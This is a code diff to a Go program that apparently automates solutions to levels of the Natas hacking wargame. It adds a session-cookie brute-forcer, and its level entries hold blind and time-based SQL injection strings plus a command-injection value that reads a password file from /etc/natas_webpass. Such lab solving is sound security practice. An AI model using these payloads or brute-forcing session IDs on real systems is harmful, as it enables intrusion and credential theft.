@@ -10,6 +10,7 @@ import (
 	"mime/multipart"
 	"net/http"
 	"net/url"
+	"strconv"
 	"strings"
 	"time"
 
@@ -268,12 +269,12 @@ func (c Combine) Grab(r http.Request) string {
 	return prefix + suffix
 }
 
-type BruteForce struct {
+type BruteForcePassword struct {
 	Field, Prefix, Suffix, First, Wildcard string
 	Grabber
 }
 
-func (s BruteForce) Grab(r http.Request) string {
+func (s BruteForcePassword) Grab(r http.Request) string {
 	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
 	var (
 		p = Post{
@@ -327,6 +328,24 @@ func (t TakesTime) Grab(r http.Request) string {
 		return "1"
 	}
 	return "0"
+}
+
+type BruteForceCookie struct {
+	Grabber
+	StartID, EndID int
+	CookieName     string
+}
+
+func (b BruteForceCookie) Grab(r http.Request) string {
+	headers := Headers{b.Grabber, SetData{"Cookie": nil}}
+	for id := b.StartID; id <= b.EndID; id++ {
+		idStr := strconv.Itoa(id)
+		headers.Headers["Cookie"] = Text{b.CookieName + "=" + idStr}
+		if headers.Grab(r) == "1" {
+			return idStr
+		}
+	}
+	panic("no cookie found")
 }
 
 var levels = [...]Grabber{
@@ -445,7 +464,7 @@ var levels = [...]Grabber{
 		nil,
 	},
 	//level 15
-	BruteForce{
+	BruteForcePassword{
 		"username",
 		"natas16\" AND password LIKE BINARY \"",
 		"",
@@ -454,7 +473,7 @@ var levels = [...]Grabber{
 		NotContain{grab, "This user doesn't exist."},
 	},
 	//level 16
-	BruteForce{
+	BruteForcePassword{
 		"needle",
 		"^$(grep -E ",
 		" /etc/natas_webpass/natas17)African",
@@ -463,13 +482,33 @@ var levels = [...]Grabber{
 		NotContain{grab, "African"},
 	},
 	//level 17
-	BruteForce{
+	BruteForcePassword{
 		"username",
 		"natas18\" AND IF (password LIKE BINARY \"",
 		"\", SLEEP(1), null) AND password != \"",
 		"",
 		"%",
 		TakesTime{grab, time.Second},
+	},
+	//level 18
+	Headers{
+		Prefixed{
+			grab,
+			"Password: ",
+			32,
+		},
+		SetData{
+			"Cookie": Combine{
+				Text{"PHPSESSID="},
+				BruteForceCookie{
+					NotContain{
+						grab,
+						"You are logged in as a regular user."},
+					0, 640,
+					"PHPSESSID",
+				},
+			},
+		},
 	},
 }
 
